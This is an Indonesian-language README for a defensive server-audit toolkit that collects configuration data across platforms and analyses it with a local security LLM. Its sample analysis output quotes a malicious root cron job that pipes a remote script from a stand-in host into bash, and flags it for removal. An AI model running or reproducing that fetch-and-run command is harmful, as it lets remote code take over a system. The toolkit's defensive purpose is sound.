🛡️ ELISAR Security Analyzer Toolkit

https://img.shields.io/badge/ELISAR-CyberAI-blue
https://img.shields.io/badge/language-Bash-green
https://img.shields.io/badge/language-Python-yellow
https://img.shields.io/badge/license-MIT-orange

Toolkit otomatisasi untuk pengumpulan dan analisis data keamanan server, terintegrasi dengan model AI ELISARCyberAIEdge7B.

Dibangun untuk membantu Security Analyst, Konsultan Keamanan, dan DevSecOps Engineer dalam melakukan audit keamanan secara efisien. Data mentah dikumpulkan dari berbagai platform, lalu dianalisis menggunakan ELISAR untuk menghasilkan rekomendasi perbaikan yang konkret.

✨ Fitur Utama
Modul	Deskripsi

Linux Server       : Mengumpulkan info sistem, user, izin file kritis, layanan, proses, jaringan, cron, dan log
Docker Container   : Menganalisis images, container running, konfigurasi, dan kerentanan
CI/CD Pipeline	   : Memeriksa keamanan pipeline (GitLab, GitHub Actions, Jenkins) dan dependency
Windows Server	   : Audit user, service, registry, event logs, dan firewall
AWS Cloud	Analisis : IAM, S3 buckets, Security Groups, EC2, dan CloudTrail
Azure Cloud	       : Pemeriksaan Azure AD, NSG, VMs, Storage Accounts, dan Key Vault

Plus: Semua data dapat dianalisis otomatis dengan ELISAR AI untuk mendapatkan rekomendasi layaknya konsultan keamanan senior.

🧠 Tentang ELISAR
ELISARCyberAIEdge7B adalah model bahasa besar yang di-fine-tune secara khusus untuk tugas keamanan siber. Model ini dilatih dengan data CVE, SAST, log keamanan, dan playbook tim biru, sehingga mampu:

- Menganalisis log dan konfigurasi sistem

- Mengidentifikasi kerentanan dan kesalahan konfigurasi

- Memberikan rekomendasi perbaikan konkret

- Membantu dalam pemodelan ancaman dan kepatuhan

Model ini berjalan offline dan ringan (format GGUF 4-bit), cocok digunakan di laptop konsultan.

📦 Struktur Repository
text

elisar-security-toolkit/

├── collect_linux.sh             # Kolektor untuk server Linux

├── collect_docker.sh            # Kolektor untuk Docker

├── collect_cicd.sh              # Kolektor untuk CI/CD pipeline

├── collect_windows.ps1          # Kolektor untuk Windows Server

├── collect_aws.sh               # Kolektor untuk AWS

├── collect_azure.sh             # Kolektor untuk Azure

├── elisar_analyzer.py           # Analisis data dengan ELISAR

├── elisar_multi_platform.py     # Wrapper untuk memilih modul

├── requirements.txt             # Dependencies Python

├── screenshots/                 # Folder contoh hasil analisis

└── README.md                    # Dokumentasi ini


🔧 Instalasi
Prasyarat

1. Python 3.8+ dan pip

2. llama.cpp dengan model ELISAR (download di sini)

3. AWS CLI (jika menggunakan modul AWS)

4. Azure CLI (jika menggunakan modul Azure)

5. Docker (jika menggunakan modul Docker)

Langkah Instalasi
bash
# Clone repository
git clone https://github.com/username/elisar-security-toolkit.git
cd elisar-security-toolkit

# Install dependencies Python
pip install -r requirements.txt

# Buat file konfigurasi (sesuaikan path llama.cpp dan model)
cp config.example.py config.py
nano config.py
File config.py (buat manual)
python
# Konfigurasi ELISAR
LLAMA_CPP_PATH = "/path/to/llama.cpp/main"
MODEL_PATH = "/path/to/elisar_merged.Q4_K_M.gguf"
TEMP = 0.3
MAX_TOKENS = 2000
🚀 Cara Penggunaan
1. Kumpulkan Data dari Target
Linux Server:

bash
sudo ./collect_linux.sh
# Hasil: linux_data_TIMESTAMP.tar.gz
Docker:

bash
./collect_docker.sh
# Hasil: docker_data_TIMESTAMP.tar.gz
AWS:

bash
./collect_aws.sh profile-name
# Hasil: aws_data_TIMESTAMP.tar.gz
Windows Server (jalankan di PowerShell sebagai Administrator):

powershell
.\collect_windows.ps1
# Hasil: windows_data_TIMESTAMP.zip

2. Analisis dengan ELISAR
Ekstrak file hasil koleksi, lalu jalankan analyzer:

bash
# Ekstrak
tar -xzf linux_data_TIMESTAMP.tar.gz

# Analisis
python3 elisar_analyzer.py linux_data_TIMESTAMP/ --type full
Atau gunakan wrapper untuk proses otomatis:

bash
# Analisis Docker (koleksi + analisis)
python3 elisar_multi_platform.py --module docker

# Analisis CI/CD dengan target repo
python3 elisar_multi_platform.py --module cicd --target /path/to/repo

# Analisis AWS dengan data existing
python3 elisar_multi_platform.py --module aws --skip-collect --data-file aws_data_TIMESTAMP.tar.gz
📋 Contoh Prompt ELISAR
Beberapa template prompt yang bisa digunakan langsung:

Analisis Hardening Server
text
### Instruction:
Anda adalah ELISAR, spesialis hardening server. Berikut data konfigurasi server Linux. Identifikasi kelemahan keamanan dan berikan rekomendasi perbaikan konkret.

Data:
[tempel isi file 01_system_info.txt, 02_users_groups.txt, dll.]

### Response:
Analisis Indikasi Serangan
text
### Instruction:
Anda adalah ELISAR, analis forensik. Berikut cuplikan log server 1 jam terakhir. Apakah ada indikasi serangan? Berikan analisis dan rekomendasi.

Data log:
[tempel isi 07_logs_recent.txt]

### Response:
Analisis Keamanan Cloud
text
### Instruction:
Anda adalah ELISAR, ahli keamanan cloud. Berikut data konfigurasi AWS. Analisis berdasarkan CIS Benchmarks dan berikan temuan kritis.

Data:
[tempel file JSON dari folder hasil]

### Response:
📊 Contoh Output Analisis
text
=== REKOMENDASI PENCEGAHAN ===

1. **Izin file /etc/shadow terlalu longgar:**
   - Saat ini: 640
   - Risiko: Pengguna dalam group shadow dapat membaca hash password.
   - Rekomendasi: `sudo chmod 600 /etc/shadow`

2. **Cron job mencurigakan:**
   - Ditemukan: `*/5 * * * * root curl -s http://suspicious.site/update.sh | bash`
   - Rekomendasi: Segera hapus dan investigasi.
   - Perintah: `sudo rm /etc/cron.d/suspicious`

3. **Port SSH terbuka ke publik:**
   - Security Group mengizinkan 0.0.0.0/0 ke port 22
   - Risiko: Brute force attack
   - Rekomendasi: Batasi IP yang bisa mengakses
📚 Requirements
Python Dependencies (requirements.txt)
text

flask>=2.0.0
requests>=2.25.0
jinja2>=3.0.0

System Dependencies
bash 4.0+
1. coreutils (ls, cat, grep, etc.)
2. systemctl (untuk Linux)
3. docker (untuk modul Docker)
4. awscli (untuk modul AWS)
5. azure-cli (untuk modul Azure)

🤝 Kontribusi
Kontribusi sangat diterima! Jika Anda menemukan bug atau ingin menambahkan fitur:

1. Fork repository
2. Buat branch baru (git checkout -b fitur-keren)
3. Commit perubahan (git commit -m 'Add some feature')
4. Push ke branch (git push origin fitur-keren)
5. Buat Pull Request

📄 Lisensi
MIT License - Silakan gunakan, modifikasi, dan distribusikan kembali.

⚠️ Catatan Penting
Skrip ini adalah alat bantu analisis, bukan pengganti judgement manusia.
Selalu verifikasi rekomendasi ELISAR sebelum menerapkannya di production.
Pastikan memiliki izin yang sah sebelum mengaudit sistem pihak lain.

📞 Kontak & Diskusi
GitHub Issues: Untuk laporan bug dan permintaan fitur

LinkedIn: www.linkedin.com/in/zaktoun-7a9b5b152
Email: zaktounshine@gmail.com

Dibangun dengan ❤️ untuk keamanan siber yang lebih proaktif.

🖼️ Screenshot
Tambahkan screenshot hasil analisis di folder /screenshots dan tampilkan di sini.

https://screenshots/contoh-analisis.png
